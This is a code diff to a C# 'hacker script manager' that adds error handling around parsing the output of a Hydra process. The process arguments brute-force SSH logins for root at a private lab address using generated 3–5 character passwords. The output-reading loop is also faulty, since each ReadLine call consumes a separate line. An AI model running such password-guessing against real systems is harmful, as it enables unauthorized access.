@@ -51,20 +51,27 @@ namespace hacker_script_manager
           
             p.StartInfo.Arguments = "-l root -x 3:5:a 172.16.1.2 -t 4 ssh -v -V -I";
             p.Start();
-            
-            while (!p.StandardOutput.EndOfStream)
+
+            try
             {
-                if (p.StandardOutput.ReadLine().Contains("[ATTEMPT]"))
+                while (!p.StandardOutput.EndOfStream)
                 {
-                    
-                    ShowMatch(p.StandardOutput.ReadLine(), @"([^\-]+$)");
+                    if (p.StandardOutput.ReadLine().Contains("[ATTEMPT]"))
+                    {
+
+                        ShowMatch(p.StandardOutput.ReadLine(), @"([^\-]+$)");
+                    }
+                    else if (p.StandardOutput.ReadLine().Contains("[ERROR]"))
+                    {
+                        var pattern = @"\[(\w*)\]";
+                        var replaced = Regex.Replace(p.StandardOutput.ReadLine(), pattern, "?");
+                        ShowMatch(replaced, @"(?<=\?).*");
+                    }
                 }
-                else if (p.StandardOutput.ReadLine().Contains("[ERROR]"))
-                {
-                    var pattern = @"\[(\w*)\]";
-                    var replaced = Regex.Replace(p.StandardOutput.ReadLine(), pattern, "?");
-                    ShowMatch(replaced, @"(?<=\?).*");
-                }
+            }
+            catch
+            {
+                Console.WriteLine("Hydra has been stopped..");
             }
         }
 
